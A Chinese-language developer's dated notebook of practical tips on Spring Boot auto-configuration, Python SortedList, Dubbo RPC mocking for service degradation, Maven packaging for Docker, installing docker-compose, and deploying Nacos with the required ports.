需要提供bean给其他jar包进行使用的时候，最好使用 auto-configuration 方式（`spring-boot-starters`里面的都是通过这种方式来进行提供的，他的所有初始化的过程全部在`spring-boot-autoconfigure`项目中），因为能更好的控制类文件的加载顺序。有助于维护更佳复杂的项目。

## 2022.3.19

### Python SortedList

```python
from sortedcontainers import SortedList
```

add 添加元素

discard 删除元素

bisect_left 第一个元素下标

bisect_right 最后一个元素下标+1

注释或打开zprofile

## 2022.4.24

在使用CompletableFuture时，Dubbo RPC调用时无法成功传递Token

### Dubbo服务降级处理

1.   在对应的RemoteUserService下创建一个RemoteUserServiceMock类，并实现RemoteUserService

     <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20230424021527247.png" alt="image-20230424021527247" style="zoom:50%;" />

2.   通过DubboReference引入远程接口时，添加mock="true"

     ```
     @DubboReference(mock = "true")
     private RemoteUserService remoteUserService;
     ```


## 2022.4.25

### 为Springboot编写Dockerfile

需要使用`maven-jar-plugin`插件为Spring Boot应用程序生成主清单文件。

```
<build>
    <finalName>${project.artifactId}</finalName>
    <plugins>
        <plugin>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-maven-plugin</artifactId>
            <version>${spring-boot.version}</version>
            <executions>
                <execution>
                    <goals>
                        <goal>repackage</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose

**Nacos在Docker部署一定要开放9848端口！！！！！！！！！！**

```
  nacos:
    image: nacos/nacos-server:v2.1.2-slim
    container_name: nacos
    restart: always
    environment:
      MODE: standalone
      TZ: Asia/Shanghai
      JAVA_OPTS: "-Xms256m -Xmx512m"
    ports:
      - "8848:8848"
      - "9848:9848"
      - "9849:9849"
```

